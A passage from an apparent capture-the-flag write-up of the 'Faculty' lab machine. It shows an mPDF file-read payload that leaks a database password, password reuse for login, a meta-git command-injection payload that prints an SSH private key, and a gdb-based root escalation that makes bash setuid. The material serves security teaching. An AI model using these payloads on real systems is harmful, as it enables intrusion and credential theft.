                                                <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;banner&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;(&quot;</span><span class="p">,</span><span class="s2">&quot;)&quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">),</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;banner&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
                                                <span class="nv">$fname</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;y-m-d H:i&#39;</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;banner&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
                                                <span class="nv">$move</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;banner&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="s1">&#39;assets/uploads/&#39;</span><span class="o">.</span> <span class="nv">$fname</span><span class="p">);</span>
                                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, banner = &#39;</span><span class="si">$fname</span><span class="s2">&#39; &quot;</span><span class="p">;</span>

                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>

                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO events set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="p">);</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE events set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot; where id=&quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">)</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">delete_event</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM events where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">function</span> <span class="nf">participate</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; event_id = &#39;</span><span class="si">$event_id</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, user_id = &#39;</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$commit</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO event_commits set </span><span class="si">$data</span><span class="s2"> &quot;</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$commit</span><span class="p">)</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

        <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Since we know that we’re working with mysql we can probably also leak db_connect</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>lfi.py<span class="w"> </span>/var/www/scheduling/admin/db_connect.php
<span class="w">                          </span>_____<span class="w">  </span>_____<span class="w">  </span>______<span class="w">   </span>______<span class="w"> </span>___<span class="w">  </span>__<span class="w">   </span>__<span class="w">                  </span>_<span class="w">       </span>_<span class="w"> </span>_
<span class="w">                         </span><span class="p">|</span><span class="w">  </span>__<span class="w"> </span><span class="se">\|</span><span class="w">  </span>__<span class="w"> </span><span class="se">\|</span><span class="w">  </span>____<span class="p">|</span><span class="w"> </span><span class="p">|</span>____<span class="w">  </span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\ \ \ </span>/<span class="w"> </span>/<span class="w">                 </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="o">(</span>_<span class="o">)</span><span class="w"> </span><span class="p">|</span>
<span class="w">               </span>_<span class="w"> </span>__<span class="w"> </span>___<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="w">        </span>/<span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\ </span>V<span class="w"> </span>/<span class="w">    </span>_____<span class="w">  </span>___<span class="w"> </span>__<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>___<span class="w">  </span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_
<span class="w">               </span><span class="p">|</span><span class="w"> </span><span class="s1">&#39;_ ` _ \|  ___/| |  | |  __|      / /| | | |  &gt; &lt;    / _ \ \/ / &#39;</span>_<span class="w"> </span><span class="se">\|</span><span class="w"> </span><span class="p">|</span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>__<span class="p">|</span>
<span class="w">               </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">        </span>/<span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/<span class="w"> </span>.<span class="w"> </span><span class="se">\ </span><span class="w"> </span><span class="p">|</span><span class="w">  </span>__/&gt;<span class="w">  </span>&lt;<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>_<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_
<span class="w">               </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="w">    </span><span class="p">|</span>_____/<span class="p">|</span>_<span class="p">|</span><span class="w">       </span>/_/<span class="w"> </span><span class="o">(</span>_<span class="o">)</span>___<span class="o">(</span>_<span class="o">)</span>_/<span class="w"> </span><span class="se">\_\ </span><span class="w"> </span><span class="se">\_</span>__/_/<span class="se">\_\ </span>.__/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span>
<span class="w">                                                                               </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
<span class="w">                                                                               </span><span class="p">|</span>_<span class="p">|</span>
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Replace<span class="w"> </span>the<span class="w"> </span>content<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>payload<span class="w"> </span>below
Double<span class="w"> </span>url<span class="w"> </span>encoded<span class="w"> </span>payload:
%253Cannotation%2520file%253D%2522/var/www/scheduling/admin/db_connect.php%2522%2520content%253D%2522/var/www/scheduling/admin/db_connect.php%2522%2520icon%253D%2522Graph%2522%2520title%253D%2522Attached%2520File%253A%2520/var/www/scheduling/admin/db_connect.php%2522%2520pos-x%253D%2522195%2522%2520/%253E

Base64<span class="w"> </span>encoded<span class="w"> </span>payload:
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlJTI1M0QlMjUyMi92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwY29udGVudCUyNTNEJTI1MjIvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwJTI1MjIlMjUyMGljb24lMjUzRCUyNTIyR3JhcGglMjUyMiUyNTIwdGl0bGUlMjUzRCUyNTIyQXR0YWNoZWQlMjUyMEZpbGUlMjUzQSUyNTIwL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9kYl9jb25uZWN0LnBocCUyNTIyJTI1MjBwb3MteCUyNTNEJTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
</pre></div>
</div>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="nv">$conn</span><span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="s1">&#39;sched&#39;</span><span class="p">,</span><span class="s1">&#39;Co.met06aci.dly53ro.per&#39;</span><span class="p">,</span><span class="s1">&#39;scheduling_db&#39;</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Could not connect to mysql&quot;</span><span class="o">.</span><span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con</span><span class="p">));</span>
</pre></div>
</div>
</section>
<section id="connecting-with-a-reused-password">
<h2>Connecting with a reused password<a class="headerlink" href="#connecting-with-a-reused-password" title="Permalink to this heading">#</a></h2>
<p>Because we leaked /etc/passwd we know the sched is not a unix user but maybe the password was reused with one of the other users, wich luckily it was with gbyolo.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gbyolo@faculty:~$<span class="w"> </span><span class="nb">pwd</span>
/home/gbyolo
gbyolo@faculty:~$<span class="w"> </span>ls<span class="w"> </span>-lrt
total<span class="w"> </span><span class="m">0</span>
gbyolo@faculty:~$<span class="w"> </span><span class="nb">pwd</span>
/home/gbyolo
gbyolo@faculty:~$<span class="w"> </span>sudo<span class="w"> </span>-l
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>gbyolo:
Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>gbyolo<span class="w"> </span>on<span class="w"> </span>faculty:
<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User<span class="w"> </span>gbyolo<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>faculty:
<span class="w">    </span><span class="o">(</span>developer<span class="o">)</span><span class="w"> </span>/usr/local/bin/meta-git
</pre></div>
</div>
</section>
<section id="lateral-privesc-with-meta-git-rce">
<h2>Lateral Privesc with Meta-git RCE<a class="headerlink" href="#lateral-privesc-with-meta-git-rce" title="Permalink to this heading">#</a></h2>
<p>gbyolo has sudo priviledges to developper using something called meta-git<br />
There’s a poc for RCE on that:<br />
<a class="reference external" href="https://hackerone.com/reports/728040">https://hackerone.com/reports/728040</a><br />
<a class="reference external" href="https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49">https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49</a><br />
It only triggers if curent directory is / though for reasons that are beyond me<br />
Edit - It works because it needs to be in a place the developper can read, so not in the gbyolo home<br />
/dev/shm works too ..</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gbyolo@faculty:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/dev/shm/
gbyolo@faculty:/dev/shm$<span class="w"> </span><span class="nb">pwd</span>
/dev/shm
gbyolo@faculty:/dev/shm$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>developer<span class="w"> </span>meta-git<span class="w"> </span>clone<span class="w"> </span><span class="s1">&#39;asdf || id&#39;</span>
meta<span class="w"> </span>git<span class="w"> </span>cloning<span class="w"> </span>into<span class="w"> </span><span class="s1">&#39;asdf || id&#39;</span><span class="w"> </span>at<span class="w"> </span>asdf<span class="w"> </span><span class="o">||</span><span class="w"> </span>id

asdf<span class="w"> </span><span class="o">||</span><span class="w"> </span>id:
fatal:<span class="w"> </span>repository<span class="w"> </span><span class="s1">&#39;asdf&#39;</span><span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>exist
id:<span class="w"> </span>‘asdf’:<span class="w"> </span>no<span class="w"> </span>such<span class="w"> </span>user
<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>developer<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>developer<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>developer<span class="o">)</span>,1001<span class="o">(</span>debug<span class="o">)</span>,1003<span class="o">(</span>faculty<span class="o">)</span>
asdf<span class="w"> </span><span class="o">||</span><span class="w"> </span>id<span class="w"> </span>✓
<span class="o">(</span>node:21053<span class="o">)</span><span class="w"> </span>UnhandledPromiseRejectionWarning:<span class="w"> </span>Error:<span class="w"> </span>ENOENT:<span class="w"> </span>no<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory,<span class="w"> </span>chdir<span class="w"> </span><span class="s1">&#39;/dev/shm/asdf || id&#39;</span>
<span class="w">    </span>at<span class="w"> </span>process.chdir<span class="w"> </span><span class="o">(</span>internal/process/main_thread_only.js:31:12<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="o">(</span>/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>execPromise.then.catch.errorMessage<span class="w"> </span><span class="o">(</span>/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>process._tickCallback<span class="w"> </span><span class="o">(</span>internal/process/next_tick.js:68:7<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>Function.Module.runMain<span class="w"> </span><span class="o">(</span>internal/modules/cjs/loader.js:834:11<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>startup<span class="w"> </span><span class="o">(</span>internal/bootstrap/node.js:283:19<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>bootstrapNodeJSCore<span class="w"> </span><span class="o">(</span>internal/bootstrap/node.js:623:3<span class="o">)</span>
<span class="o">(</span>node:21053<span class="o">)</span><span class="w"> </span>UnhandledPromiseRejectionWarning:<span class="w"> </span>Unhandled<span class="w"> </span>promise<span class="w"> </span>rejection.<span class="w"> </span>This<span class="w"> </span>error<span class="w"> </span>originated<span class="w"> </span>either<span class="w"> </span>by<span class="w"> </span>throwing<span class="w"> </span>inside<span class="w"> </span>of<span class="w"> </span>an<span class="w"> </span>async<span class="w"> </span><span class="k">function</span><span class="w"> </span>without<span class="w"> </span>a<span class="w"> </span>catch<span class="w"> </span>block,<span class="w"> </span>or<span class="w"> </span>by<span class="w"> </span>rejecting<span class="w"> </span>a<span class="w"> </span>promise<span class="w"> </span>which<span class="w"> </span>was<span class="w"> </span>not<span class="w"> </span>handled<span class="w"> </span>with<span class="w"> </span>.catch<span class="o">()</span>.<span class="w"> </span><span class="o">(</span>rejection<span class="w"> </span>id:<span class="w"> </span><span class="m">1</span><span class="o">)</span>
<span class="o">(</span>node:21053<span class="o">)</span><span class="w"> </span><span class="o">[</span>DEP0018<span class="o">]</span><span class="w"> </span>DeprecationWarning:<span class="w"> </span>Unhandled<span class="w"> </span>promise<span class="w"> </span>rejections<span class="w"> </span>are<span class="w"> </span>deprecated.<span class="w"> </span>In<span class="w"> </span>the<span class="w"> </span>future,<span class="w"> </span>promise<span class="w"> </span>rejections<span class="w"> </span>that<span class="w"> </span>are<span class="w"> </span>not<span class="w"> </span>handled<span class="w"> </span>will<span class="w"> </span>terminate<span class="w"> </span>the<span class="w"> </span>Node.js<span class="w"> </span>process<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>non-zero<span class="w"> </span><span class="nb">exit</span><span class="w"> </span>code.
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gbyolo@faculty:/dev/shm$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>developer<span class="w"> </span>meta-git<span class="w"> </span>clone<span class="w"> </span><span class="s1">&#39;asdf || cat ~/.ssh/id_rsa&#39;</span>
meta<span class="w"> </span>git<span class="w"> </span>cloning<span class="w"> </span>into<span class="w"> </span><span class="s1">&#39;asdf || cat ~/.ssh/id_rsa&#39;</span><span class="w"> </span>at<span class="w"> </span>id_rsa

id_rsa:
fatal:<span class="w"> </span>repository<span class="w"> </span><span class="s1">&#39;asdf&#39;</span><span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>exist
-----BEGIN<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329//sdapn4ncVzRYZxACC/czxmSO5Us2S87dxyw
izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp/zBy0pVK6H7g6GMAVS
pribX/DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1Rib
...............................SNIP..................................
QzVDjJkn6+ANFdKKR3j3s9xnkb5j+U/jGzxvPGDpCiZz0I30KRtAzsBzT1ZQMEvKrchpmR
jrzHFkgTUug0lsPE4ZLB0Re6Iq3ngtaNUAAADBANBXLol4lHhpWL30or8064fjhXGjhY4g
blDouPQFIwCaRbSWLnKvKCwaPaZzocdHlr5wRXwRq8V1VPmsxX8O87y9Ro5guymsdPprXF
LETXujOl8CFiHvMA1Zf6eriE1/Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
<span class="nv">9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ</span><span class="o">==</span>
-----END<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
cat:<span class="w"> </span>id_rsa:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory
id_rsa:<span class="w"> </span><span class="nb">command</span><span class="w"> </span><span class="s1">&#39;git clone asdf || cat ~/.ssh/id_rsa id_rsa&#39;</span><span class="w"> </span>exited<span class="w"> </span>with<span class="w"> </span>error:<span class="w"> </span>Error:<span class="w"> </span>Command<span class="w"> </span>failed:<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>asdf<span class="w"> </span><span class="o">||</span><span class="w"> </span>cat<span class="w"> </span>~/.ssh/id_rsa<span class="w"> </span>id_rsa
<span class="o">(</span>node:21249<span class="o">)</span><span class="w"> </span>UnhandledPromiseRejectionWarning:<span class="w"> </span>Error:<span class="w"> </span>ENOENT:<span class="w"> </span>no<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory,<span class="w"> </span>chdir<span class="w"> </span><span class="s1">&#39;/dev/shm/id_rsa&#39;</span>
<span class="w">    </span>at<span class="w"> </span>process.chdir<span class="w"> </span><span class="o">(</span>internal/process/main_thread_only.js:31:12<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="o">(</span>/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>execPromise.then.catch.errorMessage<span class="w"> </span><span class="o">(</span>/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>process._tickCallback<span class="w"> </span><span class="o">(</span>internal/process/next_tick.js:68:7<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>Function.Module.runMain<span class="w"> </span><span class="o">(</span>internal/modules/cjs/loader.js:834:11<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>startup<span class="w"> </span><span class="o">(</span>internal/bootstrap/node.js:283:19<span class="o">)</span>
<span class="w">    </span>at<span class="w"> </span>bootstrapNodeJSCore<span class="w"> </span><span class="o">(</span>internal/bootstrap/node.js:623:3<span class="o">)</span>
<span class="o">(</span>node:21249<span class="o">)</span><span class="w"> </span>UnhandledPromiseRejectionWarning:<span class="w"> </span>Unhandled<span class="w"> </span>promise<span class="w"> </span>rejection.<span class="w"> </span>This<span class="w"> </span>error<span class="w"> </span>originated<span class="w"> </span>either<span class="w"> </span>by<span class="w"> </span>throwing<span class="w"> </span>inside<span class="w"> </span>of<span class="w"> </span>an<span class="w"> </span>async<span class="w"> </span><span class="k">function</span><span class="w"> </span>without<span class="w"> </span>a<span class="w"> </span>catch<span class="w"> </span>block,<span class="w"> </span>or<span class="w"> </span>by<span class="w"> </span>rejecting<span class="w"> </span>a<span class="w"> </span>promise<span class="w"> </span>which<span class="w"> </span>was<span class="w"> </span>not<span class="w"> </span>handled<span class="w"> </span>with<span class="w"> </span>.catch<span class="o">()</span>.<span class="w"> </span><span class="o">(</span>rejection<span class="w"> </span>id:<span class="w"> </span><span class="m">2</span><span class="o">)</span>
<span class="o">(</span>node:21249<span class="o">)</span><span class="w"> </span><span class="o">[</span>DEP0018<span class="o">]</span><span class="w"> </span>DeprecationWarning:<span class="w"> </span>Unhandled<span class="w"> </span>promise<span class="w"> </span>rejections<span class="w"> </span>are<span class="w"> </span>deprecated.<span class="w"> </span>In<span class="w"> </span>the<span class="w"> </span>future,<span class="w"> </span>promise<span class="w"> </span>rejections<span class="w"> </span>that<span class="w"> </span>are<span class="w"> </span>not<span class="w"> </span>handled<span class="w"> </span>will<span class="w"> </span>terminate<span class="w"> </span>the<span class="w"> </span>Node.js<span class="w"> </span>process<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>non-zero<span class="w"> </span><span class="nb">exit</span><span class="w"> </span>code.
</pre></div>
</div>
</section>
<section id="privesc-with-gdb">
<h2>Privesc with GDB<a class="headerlink" href="#privesc-with-gdb" title="Permalink to this heading">#</a></h2>
<p>We’re now developer, looking at the groups, it’s a member of debug, which gives access to use gdb on a running processes, and I saw that gdb is installed with linpeas earlier.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>id
<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>developer<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>developer<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>developer<span class="o">)</span>,1001<span class="o">(</span>debug<span class="o">)</span>,1003<span class="o">(</span>faculty<span class="o">)</span>
wc<span class="w"> </span>-c<span class="w"> </span>user.txt
<span class="m">33</span><span class="w"> </span>user.txt
</pre></div>
</div>
<p>Finding a thing that runs as root</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ps<span class="w"> </span>-ef<span class="p">|</span>grep<span class="w"> </span>^root<span class="p">|</span>grep<span class="w"> </span>python
root<span class="w">         </span><span class="m">716</span><span class="w">       </span><span class="m">1</span><span class="w">  </span><span class="m">0</span><span class="w"> </span><span class="m">12</span>:25<span class="w"> </span>?<span class="w">        </span><span class="m">00</span>:00:00<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/usr/bin/networkd-dispatcher<span class="w"> </span>--run-startup-triggers
</pre></div>
</div>
<p>dropping a system call with the debugger and giving suid to bash</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gdb<span class="w"> </span>-p<span class="w"> </span><span class="m">716</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>call<span class="w"> </span><span class="o">(</span>void<span class="o">)</span>system<span class="o">(</span><span class="s2">&quot;chmod u+s /bin/bash&quot;</span><span class="o">)</span>
<span class="o">[</span>Detaching<span class="w"> </span>after<span class="w"> </span>vfork<span class="w"> </span>from<span class="w"> </span>child<span class="w"> </span>process<span class="w"> </span><span class="m">21697</span><span class="o">]</span>
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>quit
A<span class="w"> </span>debugging<span class="w"> </span>session<span class="w"> </span>is<span class="w"> </span>active.

<span class="w">        </span>Inferior<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">[</span>process<span class="w"> </span><span class="m">716</span><span class="o">]</span><span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>detached.

Quit<span class="w"> </span>anyway?<span class="w"> </span><span class="o">(</span>y<span class="w"> </span>or<span class="w"> </span>n<span class="o">)</span><span class="w"> </span>y
Detaching<span class="w"> </span>from<span class="w"> </span>program:<span class="w"> </span>/usr/bin/python3.8,<span class="w"> </span>process<span class="w"> </span><span class="m">716</span>
<span class="o">[</span>Inferior<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>process<span class="w"> </span><span class="m">716</span><span class="o">)</span><span class="w"> </span>detached<span class="o">]</span>
</pre></div>
</div>
<p>here we go</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>developer@faculty:~$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/bin/bash
-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">1183448</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:14<span class="w"> </span>/bin/bash
developer@faculty:~$<span class="w"> </span>bash<span class="w"> </span>-p
bash-5.0#<span class="w"> </span>wc<span class="w"> </span>-c<span class="w"> </span>/root/root.txt
<span class="m">33</span><span class="w"> </span>/root/root.txt
</pre></div>
</div>
</section>
</section>

        </article>
      </div>
      <footer>
        
        <div class="related-pages">
          <a class="next-page" href="../forgot/forgot.html">
              <div class="page-info">
                <div class="context">
                  <span>Next</span>
                </div>
                <div class="title">Forgot</div>
              </div>
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
            </a>
          <a class="prev-page" href="../awkward/awkward.html">
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
              <div class="page-info">
                <div class="context">
                  <span>Previous</span>
                </div>
                
                <div class="title">Awkward</div>
                
              </div>
            </a>
        </div>
        <div class="bottom-of-page">
          <div class="left-details">
            <div class="copyright">
                Copyright &#169; 2023, blnkn
            </div>
            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
            
            <a href="https://github.com/pradyunsg/furo">Furo</a>
            
          </div>
          <div class="right-details">
            
          </div>
        </div>
        
      </footer>
    </div>
    <aside class="toc-drawer">
      
      
      <div class="toc-sticky toc-scroll">
        <div class="toc-title-container">
          <span class="toc-title">
            On this page
          </span>
        </div>
        <div class="toc-tree-container">
          <div class="toc-tree">
            <ul>
<li><a class="reference internal" href="#">Faculty</a><ul>
<li><a class="reference internal" href="#enum">enum</a></li>
<li><a class="reference internal" href="#login-bypass">Login bypass</a></li>
<li><a class="reference internal" href="#enum-as-admin">Enum as admin</a></li>
<li><a class="reference internal" href="#sqli">SQLi</a></li>
<li><a class="reference internal" href="#exploring-potential-exploits-for-mpdf">Exploring potential exploits for mPDF</a></li>
<li><a class="reference internal" href="#circling-back-to-the-mpdf-lfi">Circling back to the mPDF LFI</a></li>
<li><a class="reference internal" href="#connecting-with-a-reused-password">Connecting with a reused password</a></li>
<li><a class="reference internal" href="#lateral-privesc-with-meta-git-rce">Lateral Privesc with Meta-git RCE</a></li>
<li><a class="reference internal" href="#privesc-with-gdb">Privesc with GDB</a></li>
</ul>
</li>
